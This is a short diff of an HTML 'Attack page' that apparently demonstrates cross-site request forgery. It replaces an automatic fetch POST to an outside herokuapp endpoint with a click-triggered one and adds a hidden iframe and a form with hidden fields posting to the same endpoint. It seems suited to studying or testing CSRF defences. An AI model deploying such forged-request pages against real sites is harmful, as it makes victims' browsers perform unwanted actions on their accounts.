@@ -6,10 +6,20 @@
   <body>
     <h3> Attack page </h3>
     <script>
-      fetch('https://quiet-eyrie-24435.herokuapp.com/api/form', {
-        method: 'POST',
-        body: JSON.stringify({'att1': 'val1', 'att2': 'val2', 'att3': 'val3'}),
-      });
+      let submitPost = () => {
+        fetch('https://quiet-eyrie-24435.herokuapp.com/api/form', {
+          method: 'POST',
+          body: JSON.stringify({att1: 'val1', att2: 'val2', att3: 'val3'}),
+        });
+      }
     </script>
+    <iframe title="hiddenframe" name="hiddenframe" id="hiddenframe"> </iframe>
+    <form action='https://quiet-eyrie-24435.herokuapp.com/api/form' method="POST" target="hiddenframe">
+      <input type="hidden" name="attacker1" value="val1"/>
+      <input type="hidden" name="attacker2" value="val2"/>
+      <input type="hidden" name="attacker3" value="val3"/>
+      <input type="submit" value="Submit Form" />
+    </form>
+    <input type="submit" value="Submit POST" onclick="submitPost" />
   </body>
 </html>
